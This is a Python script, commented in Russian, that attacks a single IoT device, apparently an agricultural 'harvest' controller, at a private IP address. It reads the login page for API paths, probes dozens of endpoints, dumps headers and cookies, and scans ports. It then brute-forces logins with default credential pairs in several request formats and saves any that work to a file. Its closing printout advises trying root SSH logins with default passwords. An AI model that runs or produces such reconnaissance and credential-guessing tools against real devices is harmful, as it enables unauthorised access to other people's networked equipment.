import requests
import json
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin


# ==========================================
# ИССЛЕДОВАНИЕ СТРАНИЦЫ ВХОДА
# ==========================================
def analyze_login_page():
    """
    Анализирует HTML страницы входа для поиска API-эндпоинтов.
    """
    print("=" * 70)
    print("АНАЛИЗ СТРАНИЦЫ ВХОДА")
    print("=" * 70)

    urls = [
        f"http://192.168.137.57/",
        f"http://192.168.137.57:8000/",
    ]

    for url in urls:
        print(f"\n[*] Анализирую: {url}")
        try:
            r = requests.get(url, timeout=5)

            # Ищем все скрипты
            scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', r.text)
            print(f"Найденные скрипты: {scripts}")

            # Ищем все ссылки
            links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
            print(f"Найденные ссылки: {links[:20]}")

            # Ищем fetch/ajax запросы в inline скриптах
            fetches = re.findall(r'fetch\(["\']([^"\']+)["\']\)', r.text)
            print(f"Fetch запросы: {fetches}")

            # Ищем axios запросы
            axios = re.findall(r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']', r.text)
            print(f"Axios запросы: {axios}")

            # Ищем API пути
            api_paths = re.findall(r'["\'](/api/[^"\']+)["\']', r.text)
            print(f"API пути: {api_paths}")

            # Ищем формы
            forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.DOTALL)
            for form in forms:
                action = re.search(r'action=["\']([^"\']+)["\']', form)
                if action:
                    print(f"Форма action: {action.group(1)}")

        except Exception as e:
            print(f"Ошибка: {e}")


# ==========================================
# ПОИСК API ЭНДПОИНТОВ
# ==========================================
def find_api_endpoints():
    """
    Ищет API-эндпоинты различными методами.
    """
    print("\n" + "=" * 70)
    print("ПОИСК API ЭНДПОИНТОВ")
    print("=" * 70)

    # Частые эндпоинты для IoT/агрономических систем
    endpoints = [
        # Auth
        "/login", "/auth", "/api/login", "/api/auth", "/token", "/api/token",
        "/auth/login", "/api/auth/login", "/api/v1/auth/login",

        # Users
        "/users", "/api/users", "/api/v1/users",

        # Devices (устройства/датчики)
        "/devices", "/api/devices", "/api/v1/devices",
        "/sensors", "/api/sensors", "/api/v1/sensors",

        # Data
        "/data", "/api/data", "/api/v1/data",
        "/readings", "/api/readings", "/api/v1/readings",
        "/measurements", "/api/measurements",

        # Status
        "/status", "/api/status", "/api/v1/status",
        "/health", "/api/health", "/healthz",

        # Dashboard
        "/dashboard", "/api/dashboard",

        # Specific to harvest/agriculture
        "/harvest", "/api/harvest", "/api/v1/harvest",
        "/crops", "/api/crops", "/api/v1/crops",
        "/greenhouse", "/api/greenhouse",
        "/urozhai", "/api/urozhai",  # Название сервиса

        # FastAPI specific
        "/openapi.json", "/docs", "/redoc",
        "/api/openapi.json", "/api/docs",

        # Common IoT
        "/telemetry", "/api/telemetry",
        "/metrics", "/api/metrics",
        "/config", "/api/config",
    ]

    found_endpoints = []

    for port in [8000, 80]:
        print(f"\n--- Проверка порта {port} ---")
        for endpoint in endpoints:
            url = f"http://192.168.137.57:{port}{endpoint}"
            try:
                r = requests.get(url, timeout=2)

                # Проверяем, не перенаправляет ли на страницу входа
                if "Вход в систему" not in r.text and r.status_code != 404:
                    content_type = r.headers.get('Content-Type', '')
                    print(f"[+] {url} -> {r.status_code} ({content_type})")

                    # Если JSON
                    if 'json' in content_type:
                        try:
                            data = r.json()
                            print(f"    Данные: {json.dumps(data, indent=2, ensure_ascii=False)[:500]}")
                            found_endpoints.append((url, data))
                        except:
                            pass
                    else:
                        print(f"    Ответ: {r.text[:200]}")
                        found_endpoints.append((url, r.text[:200]))
            except:
                pass

    return found_endpoints


# ==========================================
# ПОПЫТКА АУТЕНТИФИКАЦИИ
# ==========================================
def try_authentication():
    """
    Пробует различные варианты аутентификации.
    """
    print("\n" + "=" * 70)
    print("ПОПЫТКА АУТЕНТИФИКАЦИИ")
    print("=" * 70)

    # Частые комбинации для IoT устройств
    credentials = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("root", "root"),
        ("root", "password"),
        ("root", "fa"),  # FriendlyARM часто использует fa
        ("pi", "pi"),
        ("pi", "raspberry"),
        ("admin", "fa"),  # FriendlyARM дефолт
        ("user", "user"),
        ("test", "test"),
    ]

    # Эндпоинты для логина
    login_endpoints = [
        (8000, "/login", "POST"),
        (8000, "/api/login", "POST"),
        (8000, "/api/auth/login", "POST"),
        (8000, "/token", "POST"),
        (80, "/login", "POST"),
        (80, "/api/login", "POST"),
        (80, "/api/auth/login", "POST"),
    ]

    for username, password in credentials:
        for port, endpoint, method in login_endpoints:
            url = f"http://192.168.137.57:{port}{endpoint}"
            try:
                # Пробуем разные форматы
                data_formats = [
                    {"username": username, "password": password},
                    {"user": username, "pass": password},
                    {"login": username, "password": password},
                    f"username={username}&password={password}",
                ]

                for data in data_formats:
                    try:
                        if method == "POST":
                            if isinstance(data, dict):
                                r = requests.post(url, json=data, timeout=2)
                            else:
                                r = requests.post(url, data=data, timeout=2)
                        else:
                            r = requests.get(url, auth=(username, password), timeout=2)

                        if r.status_code == 200 and "token" in r.text.lower():
                            print(f"[!] УСПЕХ! {username}:{password} -> {url}")
                            print(f"    Ответ: {r.text[:200]}")
                            return (username, password, r.text)
                        elif r.status_code == 401:
                            pass  # Неправильный пароль
                        elif r.status_code == 200 and "Вход в систему" not in r.text:
                            print(f"[?] Возможен успех: {username}:{password} -> {url}")
                            print(f"    Status: {r.status_code}")
                    except:
                        pass
            except:
                pass

    print("[-] Стандартные пароли не подошли")
    return None


# ==========================================
# АНАЛИЗ ЗАГОЛОВКОВ И КУКИ
# ==========================================
def analyze_headers_and_cookies():
    """
    Анализирует заголовки ответов и куки.
    """
    print("\n" + "=" * 70)
    print("АНАЛИЗ ЗАГОЛОВКОВ И КУК")
    print("=" * 70)

    for port in [80, 8000]:
        url = f"http://192.168.137.57:{port}/"
        try:
            r = requests.get(url, timeout=5)
            print(f"\n--- {url} ---")
            print(f"Status: {r.status_code}")
            print("Заголовки:")
            for key, value in r.headers.items():
                print(f"  {key}: {value}")

            if r.cookies:
                print("Куки:")
                for cookie in r.cookies:
                    print(f"  {cookie.name}: {cookie.value[:50]}")

            # Проверяем наличие JWT токенов
            if 'Authorization' in r.headers:
                print(f"Authorization: {r.headers['Authorization']}")

            # Ищем Set-Cookie с токенами
            if 'Set-Cookie' in r.headers:
                print(f"Set-Cookie: {r.headers['Set-Cookie']}")

        except Exception as e:
            print(f"Ошибка: {e}")


# ==========================================
# СКАНИРОВАНИЕ ДОПОЛНИТЕЛЬНЫХ ПОРТОВ
# ==========================================
def scan_additional_ports():
    """
    Сканирует дополнительные порты, которые могли быть не замечены.
    """
    print("\n" + "=" * 70)
    print("СКАНИРОВАНИЕ ДОПОЛНИТЕЛЬНЫХ ПОРТОВ")
    print("=" * 70)

    import socket

    ports = [
        22,  # SSH
        80,  # HTTP
        443,  # HTTPS
        3000,  # Node.js
        5000,  # Flask
        5432,  # PostgreSQL
        6379,  # Redis
        8000,  # FastAPI
        8001,  # Alt
        8080,  # HTTP Alt
        8081,  # Alt
        8888,  # Jupyter
        9000,  # Alt
        9090,  # Prometheus
        1883,  # MQTT
        1880,  # Node-RED
    ]

    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex(("192.168.137.57", port))
        if result == 0:
            print(f"[+] Порт {port} открыт")
            # Пробуем получить информацию
            try:
                if port in [80, 8000, 8080, 3000, 5000]:
                    r = requests.get(f"http://192.168.137.57:{port}/", timeout=2)
                    print(f"    HTTP Status: {r.status_code}")
                    print(f"    Server: {r.headers.get('Server', 'N/A')}")
            except:
                pass
        sock.close()


# ==========================================
# ГЛАВНАЯ ФУНКЦИЯ
# ==========================================
def main():
    print("=" * 70)
    print("ГЛУБОКИЙ АНАЛИЗ УСТРОЙСТВА 192.168.137.57")
    print("=" * 70)

    # 1. Анализ заголовков
    analyze_headers_and_cookies()

    # 2. Анализ страницы входа
    analyze_login_page()

    # 3. Поиск API эндпоинтов
    find_api_endpoints()

    # 4. Сканирование портов
    scan_additional_ports()

    # 5. Попытка аутентификации
    auth_result = try_authentication()

    if auth_result:
        print("\n" + "!" * 70)
        print("УСПЕШНАЯ АУТЕНТИФИКАЦИЯ!")
        print("!" * 70)
        username, password, response = auth_result
        print(f"Логин: {username}")
        print(f"Пароль: {password}")
        print(f"Ответ: {response[:500]}")

        # Сохраняем результат
        with open("auth_result.txt", "w") as f:
            f.write(f"URL: http://192.168.137.57\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Response: {response}\n")

    print("\n" + "=" * 70)
    print("РЕКОМЕНДАЦИИ")
    print("=" * 70)
    print("1. Откройте в браузере: http://192.168.137.57")
    print("   - Посмотрите, какие данные запрашивает форма входа")
    print("   - Проверьте через DevTools (F12) вкладку Network")
    print("   - Найдите XHR/Fetch запросы к API")
    print()
    print("2. Попробуйте SSH с паролями:")
    print("   ssh root@192.168.137.57")
    print("   Пароли: fa, password, 12345, root")
    print()
    print("3. Проверьте документацию API:")
    print("   http://192.168.137.57:8000/docs")
    print("   http://192.168.137.57:8000/openapi.json")
    print()
    print("4. Посмотрите HTML страницы через браузер")
    print("   - Нажмите F12 -> Network -> Обновите страницу")
    print("   - Найдите запросы к /api/*")


if __name__ == "__main__":
    main()
